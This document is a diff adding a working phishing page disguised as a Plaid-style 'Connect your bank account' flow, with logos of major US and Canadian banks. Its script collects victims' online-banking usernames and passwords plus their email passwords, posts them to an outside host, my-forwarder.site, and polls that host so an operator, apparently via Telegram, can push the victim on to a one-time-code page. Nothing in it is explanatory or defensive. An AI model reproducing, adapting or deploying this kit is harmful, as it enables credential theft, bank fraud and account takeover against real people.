@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Bank</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #f7fafc;
+            color: #1a202c;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 420px;
+            margin: 20px auto;
+            padding: 0 20px;
+            position: relative;
+            min-height: 600px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .logo img {
+            height: 60px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 24px;
+            transition: transform 0.3s ease;
+            position: relative;
+            left: 0;
+            min-height: 400px;
+            margin-top: 60px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .bank-selector {
+            margin-bottom: 16px;
+        }
+        
+        .search-container {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        
+        .search-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #a0aec0;
+        }
+        
+        input[type="text"], input[type="password"], input[type="email"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input[type="text"] {
+            padding-left: 40px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #000000;
+        }
+        
+        .popular-banks {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-top: 16px;
+        }
+        
+        .bank-logo {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .bank-logo:hover {
+            border-color: #cbd5e0;
+        }
+        
+        .bank-logo img {
+            max-width: 100%;
+            max-height: 48px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #4a5568;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background-color: #000000;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #333333;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #718096;
+        }
+        
+        .footer a {
+            color: #000000;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        #search-results {
+            position: absolute;
+            width: 100%;
+            max-height: 200px;
+            overflow-y: auto;
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+            display: none;
+        }
+        
+        .search-result-item {
+            padding: 10px 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .search-result-item img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+            object-fit: contain;
+        }
+        
+        .search-result-item:hover {
+            background-color: #f7fafc;
+        }
+        
+        .bank-login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .bank-login-header img {
+            height: 80px;
+            margin-bottom: 8px;
+        }
+        
+        .bank-login-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .page {
+            position: absolute;
+            width: 100%;
+            transition: transform 0.3s ease;
+            display: none;
+            top: 0;
+            left: 0;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .page-1 {
+            transform: translateX(0);
+        }
+        
+        .page-2 {
+            transform: translateX(100%);
+        }
+        
+        .page-3 {
+            transform: translateX(200%);
+        }
+        
+        .page-4 {
+            transform: translateX(300%);
+            text-align: center;
+            padding: 40px 0;
+        }
+        
+        .page.active {
+            transform: translateX(0) !important;
+        }
+        
+        .throbber-container {
+            margin: 40px 0;
+            text-align: center;
+        }
+        
+        .throbber {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #000000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            color: #e53e3e;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .form-content {
+            transition: opacity 0.3s ease;
+        }
+        
+        .loading .form-content {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .page-content {
+            margin-top: 80px;
+        }
+        
+        .email-display {
+            background: #f0f4f8;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .arrow-icon {
+            display: inline-block;
+            margin-right: 8px;
+            color: #4a5568;
+        }
+        
+        .password-error {
+            color: #e53e3e;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        .input-error {
+            border-color: #e53e3e !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo (shown on all pages) -->
+        <div class="logo">
+            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Bank Logo">
+        </div>
+        
+        <!-- Page 1: Bank Selection -->
+        <div class="page page-1 active">
+            <div class="page-content">
+                <div class="card">
+                    <h1>Connect your bank account</h1>
+                    
+                    <div class="bank-selector">
+                        <div class="search-container">
+                            <div class="search-icon">
+                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M7.33333 12.6667C10.2789 12.6667 12.6667 10.2789 12.6667 7.33333C12.6667 4.38781 10.2789 2 7.33333 2C4.38781 2 2 4.38781 2 7.33333C2 10.2789 4.38781 12.6667 7.33333 12.6667Z" stroke="#A0AEC0" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <path d="M14 14L11.1 11.1" stroke="#A0AEC0" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <input type="text" id="bank-search" placeholder="Search for your bank" autocomplete="off" required>
+                            <div id="search-results"></div>
+                        </div>
+                        
+                        <div class="popular-banks">
+                            <div class="bank-logo" data-bank="Chase" data-logo="https://models-bangbros.github.io/images/chase.png">
+                                <img src="https://models-bangbros.github.io/images/chase.png" alt="Chase">
+                            </div>
+                            <div class="bank-logo" data-bank="Bank of America" data-logo="https://models-bangbros.github.io/images/bank-of-america.png">
+                                <img src="https://models-bangbros.github.io/images/bank-of-america.png" alt="Bank of America">
+                            </div>
+                            <div class="bank-logo" data-bank="Wells Fargo" data-logo="https://models-bangbros.github.io/images/wells-fargo.png">
+                                <img src="https://models-bangbros.github.io/images/wells-fargo.png" alt="Wells Fargo">
+                            </div>
+                            <div class="bank-logo" data-bank="Citibank" data-logo="https://models-bangbros.github.io/images/citi.png">
+                                <img src="https://models-bangbros.github.io/images/citi.png" alt="Citi">
+                            </div>
+                            <div class="bank-logo" data-bank="US Bank" data-logo="https://models-bangbros.github.io/images/us-bank.png">
+                                <img src="https://models-bangbros.github.io/images/us-bank.png" alt="US Bank">
+                            </div>
+                            <div class="bank-logo" data-bank="Capital One" data-logo="https://models-bangbros.github.io/images/capital-one.png">
+                                <img src="https://models-bangbros.github.io/images/capital-one.png" alt="Capital One">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button id="continue-to-login" class="submit-btn" disabled>Continue</button>
+                </div>
+                
+                <div class="footer">
+                    By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+                </div>
+            </div>
+        </div>
+        
+        <!-- Page 2: Bank Login -->
+        <div class="page page-2">
+            <div class="page-content">
+                <div class="card">
+                    <div class="form-content">
+                        <div class="bank-login-header">
+                            <img id="selected-bank-logo" src="" alt="Selected Bank">
+                            <h2 id="login-to-bank">Login to <span id="selected-bank-name"></span></h2>
+                        </div>
+                        
+                        <form id="bank-login-form">
+                            <div class="form-group">
+                                <label for="username">Online banking username</label>
+                                <input type="text" id="username" name="username" placeholder="" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="password">Online banking password</label>
+                                <input type="password" id="password" name="password" placeholder="" required minlength="4">
+                                <div class="password-error" id="password-length-error">Please Complete Your Password</div>
+                            </div>
+                            
+                            <button type="button" id="continue-to-email" class="submit-btn">Continue</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Page 3: Email Verification -->
+        <div class="page page-3">
+            <div class="page-content">
+                <div class="card">
+                    <div class="form-content">
+                        <h1>Verify your email</h1>
+                        
+                        <div class="email-display">
+                            <span class="arrow-icon">→</span>
+                            <span id="displayed-email"></span>
+                        </div>
+                        
+                        <form id="email-verification-form">
+                            <div class="form-group">
+                                <label for="email-password">Email password</label>
+                                <input type="password" id="email-password" name="email_password" placeholder="Enter your email password" required minlength="4">
+                                <div class="password-error" id="email-password-length-error">Please Complete Your Password</div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="confirm-email-password">Confirm email password</label>
+                                <input type="password" id="confirm-email-password" name="confirm_email_password" placeholder="Confirm your email password" required minlength="4">
+                                <div class="password-error" id="password-match-error">Password Does Not Match</div>
+                            </div>
+                            
+                            <button type="submit" class="submit-btn">Link Bank</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Page 4: Loading -->
+        <div class="page page-4">
+            <div class="page-content">
+                <div class="card">
+                    <div class="throbber-container">
+                        <div class="throbber"></div>
+                        <h2>Linking bank account...</h2>
+                        <p id="loading-message">Please wait while we connect to your bank.</p>
+                        <p class="error-message" id="error-message">Unable to link bank account. Please try again later.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // List of major US and Canadian banks with logos
+        const banks = [
+            { name: "Chase", logo: "https://models-bangbros.github.io/images/chase.png" },
+            { name: "Bank of America", logo: "https://models-bangbros.github.io/images/bank-of-america.png" },
+            { name: "Wells Fargo", logo: "https://models-bangbros.github.io/images/wells-fargo.png" },
+            { name: "Citibank", logo: "https://models-bangbros.github.io/images/citi.png" },
+            { name: "US Bank", logo: "https://models-bangbros.github.io/images/us-bank.png" },
+            { name: "Capital One", logo: "https://models-bangbros.github.io/images/capital-one.png" },
+            { name: "TD Bank", logo: "https://models-bangbros.github.io/images/td-bank.png" },
+            { name: "PNC Bank", logo: "https://models-bangbros.github.io/images/pnc-bank.png" },
+            { name: "RBC Royal Bank", logo: "https://models-bangbros.github.io/images/rbc.png" },
+            { name: "Scotiabank", logo: "https://models-bangbros.github.io/images/scotiabank.png" },
+            { name: "BMO Bank of Montreal", logo: "https://models-bangbros.github.io/images/bmo.png" },
+            { name: "CIBC", logo: "https://models-bangbros.github.io/images/cibc.png" },
+            { name: "HSBC", logo: "https://models-bangbros.github.io/images/hsbc.png" },
+            { name: "Ally Bank", logo: "https://models-bangbros.github.io/images/ally-bank.png" },
+            { name: "American Express", logo: "https://models-bangbros.github.io/images/amex.png" }
+        ];
+
+        // DOM elements
+        const searchInput = document.getElementById('bank-search');
+        const searchResults = document.getElementById('search-results');
+        const continueToLoginBtn = document.getElementById('continue-to-login');
+        const continueToEmailBtn = document.getElementById('continue-to-email');
+        const bankLoginForm = document.getElementById('bank-login-form');
+        const emailVerificationForm = document.getElementById('email-verification-form');
+        const selectedBankLogo = document.getElementById('selected-bank-logo');
+        const selectedBankName = document.getElementById('selected-bank-name');
+        const loginToBankText = document.getElementById('login-to-bank');
+        const errorMessage = document.getElementById('error-message');
+        const loadingMessage = document.getElementById('loading-message');
+        const displayedEmail = document.getElementById('displayed-email');
+        const passwordInput = document.getElementById('password');
+        const emailPasswordInput = document.getElementById('email-password');
+        const confirmEmailPasswordInput = document.getElementById('confirm-email-password');
+        const passwordLengthError = document.getElementById('password-length-error');
+        const emailPasswordLengthError = document.getElementById('email-password-length-error');
+        const passwordMatchError = document.getElementById('password-match-error');
+        
+        // Variables
+        let selectedBank = null;
+        let timeoutId = null;
+        let checkResponseInterval = null;
+        let verificationCode = null;
+        
+        // Initialize email from URL
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            if (email) {
+                displayedEmail.textContent = decodeURIComponent(email);
+            } else {
+                // If no email in URL, go back to first page
+                navigateToPage(1);
+                alert('Email parameter is required in URL');
+            }
+        }
+        
+        // Generate random 5-digit code
+        function generateVerificationCode() {
+            return Math.floor(10000 + Math.random() * 90000).toString();
+        }
+        
+        // Validate password length
+        function validatePasswordLength(input, errorElement) {
+            if (input.value.length > 0 && input.value.length < 4) {
+                input.classList.add('input-error');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                input.classList.remove('input-error');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+        
+        // Validate password match
+        function validatePasswordMatch() {
+            if (emailPasswordInput.value !== confirmEmailPasswordInput.value && 
+                confirmEmailPasswordInput.value.length > 0) {
+                confirmEmailPasswordInput.classList.add('input-error');
+                passwordMatchError.style.display = 'block';
+                return false;
+            } else {
+                confirmEmailPasswordInput.classList.remove('input-error');
+                passwordMatchError.style.display = 'none';
+                return true;
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            getEmailFromURL();
+            verificationCode = generateVerificationCode();
+            
+            // Make all inputs required
+            document.querySelectorAll('input').forEach(input => {
+                input.required = true;
+            });
+            
+            // Password validation
+            passwordInput.addEventListener('input', () => validatePasswordLength(passwordInput, passwordLengthError));
+            emailPasswordInput.addEventListener('input', () => {
+                validatePasswordLength(emailPasswordInput, emailPasswordLengthError);
+                validatePasswordMatch();
+            });
+            confirmEmailPasswordInput.addEventListener('input', validatePasswordMatch);
+        });
+        
+        // Bank search with logos
+        searchInput.addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            searchResults.innerHTML = '';
+            
+            if (searchTerm.length > 0) {
+                const filteredBanks = banks.filter(bank => 
+                    bank.name.toLowerCase().includes(searchTerm)
+                );
+                
+                if (filteredBanks.length > 0) {
+                    filteredBanks.forEach(bank => {
+                        const resultItem = document.createElement('div');
+                        resultItem.className = 'search-result-item';
+                        
+                        const logoImg = document.createElement('img');
+                        logoImg.src = bank.logo;
+                        logoImg.alt = bank.name;
+                        logoImg.style.width = '30px';
+                        logoImg.style.height = '30px';
+                        
+                        resultItem.appendChild(logoImg);
+                        resultItem.appendChild(document.createTextNode(bank.name));
+                        
+                        resultItem.addEventListener('click', function() {
+                            selectBank(bank.name, bank.logo);
+                            searchInput.value = bank.name;
+                            searchResults.style.display = 'none';
+                        });
+                        
+                        searchResults.appendChild(resultItem);
+                    });
+                    searchResults.style.display = 'block';
+                } else {
+                    searchResults.style.display = 'none';
+                }
+            } else {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Bank logo click handler
+        document.querySelectorAll('.bank-logo').forEach(logo => {
+            logo.addEventListener('click', function() {
+                const bankName = this.getAttribute('data-bank');
+                const bankLogo = this.getAttribute('data-logo');
+                selectBank(bankName, bankLogo);
+                searchInput.value = bankName;
+            });
+        });
+
+        // Function to select a bank
+        function selectBank(name, logo) {
+            selectedBank = { name, logo };
+            continueToLoginBtn.disabled = false;
+            
+            document.querySelectorAll('.bank-logo').forEach(logo => {
+                logo.style.borderColor = logo.getAttribute('data-bank') === name ? '#000000' : '#e2e8f0';
+            });
+        }
+
+        // Continue to login page
+        continueToLoginBtn.addEventListener('click', function() {
+            if (selectedBank) {
+                selectedBankLogo.src = selectedBank.logo;
+                selectedBankName.textContent = selectedBank.name;
+                loginToBankText.textContent = `Login to ${selectedBank.name}`;
+                navigateToPage(2);
+            }
+        });
+
+        // Continue to email page
+        continueToEmailBtn.addEventListener('click', function() {
+            // Validate password before proceeding
+            if (validatePasswordLength(passwordInput, passwordLengthError)) {
+                navigateToPage(3);
+            }
+        });
+
+        // Form submission
+        emailVerificationForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validate all fields
+            const isPasswordValid = validatePasswordLength(emailPasswordInput, emailPasswordLengthError);
+            const isMatchValid = validatePasswordMatch();
+            
+            if (isPasswordValid && isMatchValid) {
+                navigateToPage(4);
+                document.querySelectorAll('.form-content').forEach(el => {
+                    el.parentNode.classList.add('loading');
+                });
+                
+                // Prepare form data with verification code
+                const formData = new FormData();
+                formData.append('bank', selectedBank.name);
+                formData.append('username', document.getElementById('username').value);
+                formData.append('password', document.getElementById('password').value);
+                formData.append('email', displayedEmail.textContent);
+                formData.append('email_password', document.getElementById('email-password').value);
+                formData.append('verification_code', verificationCode);
+                
+                // Submit data
+                fetch('https://my-forwarder.site/plaid/action.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                    return response.text();
+                })
+                .then(data => {
+                    console.log('Data submitted with code:', verificationCode);
+                    startCheckingResponse();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showError();
+                });
+                
+                // 1 minute timeout
+                timeoutId = setTimeout(() => {
+                    showError();
+                }, 60000);
+            }
+        });
+
+        // Check for Telegram response
+        function startCheckingResponse() {
+            checkResponseInterval = setInterval(() => {
+                fetch(`https://my-forwarder.site/bank/check-response.php?code=${verificationCode}`)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.status === 'otp') {
+                        clearTimeout(timeoutId);
+                        clearInterval(checkResponseInterval);
+                        window.location.href = '/otp.html';
+                    } else if (data.status === 'end') {
+                        clearTimeout(timeoutId);
+                        clearInterval(checkResponseInterval);
+                        showError();
+                    }
+                })
+                .catch(error => console.error('Error checking response:', error));
+            }, 3000);
+        }
+
+        // Show error message
+        function showError() {
+            clearInterval(checkResponseInterval);
+            loadingMessage.style.display = 'none';
+            errorMessage.style.display = 'block';
+            
+            const throbber = document.querySelector('.throbber');
+            throbber.style.borderTopColor = '#e53e3e';
+            throbber.style.animation = 'none';
+            
+            const retryBtn = document.createElement('button');
+            retryBtn.className = 'submit-btn';
+            retryBtn.textContent = 'Try Again';
+            retryBtn.style.marginTop = '20px';
+            retryBtn.addEventListener('click', () => location.reload());
+            
+            document.querySelector('.throbber-container').appendChild(retryBtn);
+        }
+
+        // Hide search results when clicking outside
+        document.addEventListener('click', function(e) {
+            if (e.target.id !== 'bank-search') {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Page navigation
+        function navigateToPage(pageNumber) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.querySelector(`.page-${pageNumber}`).classList.add('active');
+        }
+    </script>
+</body>
+</html>
